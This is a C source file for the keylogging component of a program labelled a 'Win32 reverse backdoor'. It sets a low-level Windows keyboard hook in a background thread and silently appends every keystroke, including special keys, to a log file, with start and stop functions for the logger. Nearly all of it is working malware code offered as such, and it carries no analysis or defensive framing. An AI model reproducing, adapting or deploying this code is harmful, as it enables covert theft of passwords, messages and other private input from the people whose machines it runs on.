

/* Insider -- Win32 reverse backdoor */


#include "insider.h"


#define WH_KEYBOARD_LL     13
typedef struct KBDLLHOOKSTRUCT {
    DWORD   vkCode;
    DWORD   scanCode;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} KBDLLHOOKSTRUCT, FAR *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

#define crlf	"\r\n"
#define lb	"]"
#define rb	"["


HHOOK hKeyHook;
int fd;
		
LRESULT CALLBACK
KeyEvent(int code, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT 	hooked;
	int 			i, dwCount, chcount;
	char 			lpszName[256];
	BYTE 			kbuf[256];
	WORD 			ch;
	DWORD 			dwMsg;
	
	if  ((code == HC_ACTION) && 
        	((wParam == WM_SYSKEYDOWN) ||
        	(wParam == WM_KEYDOWN))) {

		hooked = *((KBDLLHOOKSTRUCT*)lParam);
		dwMsg = 1;
        	dwMsg += hooked.scanCode << 16;
        	dwMsg += hooked.flags << 24;
		
		memset(lpszName, 256, 0);

		/* Convert keycode */
		dwCount = GetKeyNameText(dwMsg, lpszName, 256);
		if(dwCount) {

			/* Write space */
			if(hooked.vkCode == VK_SPACE) {
				lpszName[0] = ' ';
				lpszName[1] = '\0';
				dwCount = 1;
			}
			/* Generate printable string */
			if(dwCount == 1) {
				/* 
				 * Get current keyboard state 
				 * XXXXXXXXXXXXXXx Not working???
				 */
				GetKeyboardState(kbuf);	
				chcount = ToAscii(hooked.vkCode, dwMsg, kbuf, &ch, 0);

				/* Write */
				if(chcount > 0)
					_write(fd, &ch, chcount);

			/* Write return normally */				
			} else if (hooked.vkCode == VK_RETURN) {
				_write(fd, crlf, 2);

			/* Write other special as GetKeyNameText() returns: */
			} else {
				_write(fd, rb, 1);
				_write(fd, lpszName, dwCount);
				_write(fd, lb, 1);
			}
		}			

	}
	return CallNextHookEx(hKeyHook, code, wParam, lParam);
}


/* This is the keylogging thread */
DWORD WINAPI KeyThread(LPVOID param) {
	HHOOK 	hKeyHook;
	MSG	msg;
	int 	i;

	/* We are now logging */
	Logging = 1;

	/* Make sure we have a writable file ready */
	fd = _open(keylogfile, _O_WRONLY|_O_CREAT|_O_EXCL, _S_IWRITE);
 	_close(fd);

	/* Open the file again for appending */
	if ((fd = _open(keylogfile, _O_WRONLY|_O_APPEND))  == -1)
		return (1);

	/* Hook the keyboard */
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, Module, 0);

	/* Loop forever and read keystrokes */
	while (Logging) {
		while (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) {
			GetMessage(&msg,NULL,0,0);
       			DispatchMessage(&msg);
    		}
		Sleep(1);
	}

	UnhookWindowsHookEx(hKeyHook);
	KeyCapThread = NULL;
	_close(fd);
	return (0);
}


/* Start keylogger */
int StartLog(char *Arg) {
	DWORD 	KeyCapTID=0;

	/* Already logging */
	if (Logging) return 2;

	/* Create thread */
	KeyCapThread = CreateThread(NULL,0, KeyThread, (LPVOID)Arg, 0, &KeyCapTID);
	if(KeyCapThread == NULL) {
		return (1);
	}
	return (0);
}

/* Stop keylogger */
int StopLog() {
	
	/* Not logging */
	if (!Logging) return (2);

	/* Not logging anymore */
	Logging = 0;

	if(WaitForSingleObject(KeyCapThread,5000) != WAIT_OBJECT_0) {
		return (1);
	}

	return (0);
}
